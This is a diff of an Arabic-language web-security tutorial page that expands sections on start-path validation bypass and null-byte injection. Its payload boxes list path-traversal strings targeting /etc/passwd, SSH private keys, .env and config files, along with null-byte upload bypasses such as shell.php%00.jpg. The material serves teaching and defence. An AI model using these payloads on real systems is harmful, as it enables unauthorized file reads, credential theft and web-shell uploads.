             <h3 class="subsection-title"><i class="fas fa-check-circle"></i> 5. Start Path Validation Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>تجاوز فحص بداية المسار المطلوبة.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Start Path Validation Bypass</strong> تستغل عيباً في آليات التحقق التي تفحص بداية المسار فقط، لكنها تفشل في التحقق من المسار بالكامل بعد معالجته. هذا النوع من الثغرات شائع في التطبيقات التي تحاول تقييد الوصول لمجلدات معينة فقط.</p>
+                
+                <p><strong>فهم آلية فشل التحقق:</strong></p>
+                <ul>
+                    <li><strong>Prefix Validation Only:</strong> التحقق من بداية المسار فقط</li>
+                    <li><strong>Path Resolution After Validation:</strong> معالجة المسار تحدث بعد التحقق</li>
+                    <li><strong>Trusted Prefix Assumption:</strong> افتراض أن البداية الصحيحة تضمن الأمان</li>
+                    <li><strong>Post-Processing Vulnerability:</strong> الثغرة تظهر بعد المعالجة</li>
+                </ul>
+
+                <p><strong>سيناريوهات الهجوم التفصيلية:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>/var/www/images/../../../etc/passwd</code>
+                    <strong>السيناريو الأساسي - Web Root Escape:</strong><br>
+                    <code>// التحقق: هل المسار يبدأ بـ /var/www/html؟ ✓<br>
+                    /var/www/html/../../../etc/passwd<br><br>
+
+                    // بعد Path Resolution:<br>
+                    /var/www/html/../../../etc/passwd → /etc/passwd<br><br>
+
+                    // النتيجة: تجاوز التحقق والوصول لملف النظام!</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>Application Directory Bypass:</strong><br>
+                    <code>// إذا كان التطبيق يسمح بالوصول لـ /app/uploads فقط<br>
+                    /app/uploads/../../../etc/passwd<br>
+                    /app/uploads/../../../var/log/apache2/access.log<br>
+                    /app/uploads/../../../home/user/.ssh/id_rsa<br><br>
+
+                    // أو للـ configuration files<br>
+                    /app/uploads/../config/database.php<br>
+                    /app/uploads/../.env</code>
+                </div>
+
+                <p><strong>تأثيرات الأمان المتقدمة:</strong></p>
+                <ul>
+                    <li><strong>System Compromise:</strong> السيطرة الكاملة على النظام</li>
+                    <li><strong>Service Disruption:</strong> تعطيل الخدمات عبر الكتابة فوق الملفات</li>
+                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات عبر تعديل ملفات النظام</li>
+                    <li><strong>Data Integrity Loss:</strong> فقدان سلامة البيانات</li>
+                </ul>
             </div>
 
-            <h3 class="subsection-title"><i class="fas fa-file-image"></i> 6. File Extension Validation Bypass</h3>
+            <h3 class="subsection-title"><i class="fas fa-file-image"></i> 6. Null Byte Injection</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>تجاوز فحص امتداد الملف باستخدام Null Byte.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Null Byte Injection</strong> تستغل اختلاف طريقة التعامل مع Null bytes بين اللغات عالية المستوى (مثل PHP, Python) واللغات منخفضة المستوى (مثل C, C++). هذه الثغرة خطيرة جداً لأنها تتيح تجاوز فحص امتدادات الملفات والمسارات.</p>
+                
+                <p><strong>الفهم العميق لآلية العمل:</strong></p>
+                <ul>
+                    <li><strong>String Termination:</strong> Null byte يعتبر نهاية string في C/C++</li>
+                    <li><strong>Language Inconsistency:</strong> لغات مختلفة تتعامل مع null bytes بشكل مختلف</li>
+                    <li><strong>System Call Interface:</strong> استدعاءات النظام تتوقف عند null byte</li>
+                    <li><strong>Input Validation Bypass:</strong> تجاوز آليات التحقق من المدخلات</li>
+                </ul>
+
+                <p><strong>السيناريوهات التقنية المفصلة:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>../../../etc/passwd%00.png</code>
+                    <strong>Extension Validation Bypass:</strong><br>
+                    <code>// السيناريو: التطبيق يقبل .jpg فقط<br>
+                    ../../../etc/passwd%00.jpg<br><br>
+
+                    // ما يراه التطبيق (PHP):<br>
+                    "../../../etc/passwd\0.jpg" → امتداد .jpg ✓<br><br>
+
+                    // ما يراه نظام التشغيل (C library):<br>
+                    "../../../etc/passwd" → يتوقف عند \0</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>تشفير Null Byte في بروتوكولات مختلفة:</strong><br>
+                    <code>%00                            // Standard URL encoding<br>
+                    %u0000                         // Unicode URL encoding<br>
+                    \x00                           // Hex representation<br>
+                    \0                             // C-style null<br>
+                    %c0%80                         // UTF-8 overlong encoding</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>استغلال في سياقات مختلفة:</strong><br>
+                    <code>// File Upload Context<br>
+                    shell.php%00.jpg               // يبدو كـ JPG للتطبيق<br>
+                    backdoor.asp%00.gif            // يبدو كـ GIF للتطبيق<br><br>
+
+                    // Path Traversal Context<br>
+                    /var/log/apache2/access.log%00.php<br>
+                    /etc/passwd%00.txt<br>
+                    /home/user/.ssh/id_rsa%00.key</code>
+                </div>
+
+                <p><strong>Modern Mitigations والتجاوز:</strong></p>
+                <ul>
+                    <li><strong>PHP 5.3.4+:</strong> إصلاح null byte injection في معظم الحالات</li>
+                    <li><strong>Modern Frameworks:</strong> حماية أفضل ضد null bytes</li>
+                    <li><strong>Still Vulnerable:</strong> تطبيقات قديمة، custom implementations</li>
+                    <li><strong>Alternative Injections:</strong> استخدام أحرف أخرى كبدائل</li>
+                </ul>
             </div>
         </div>
 
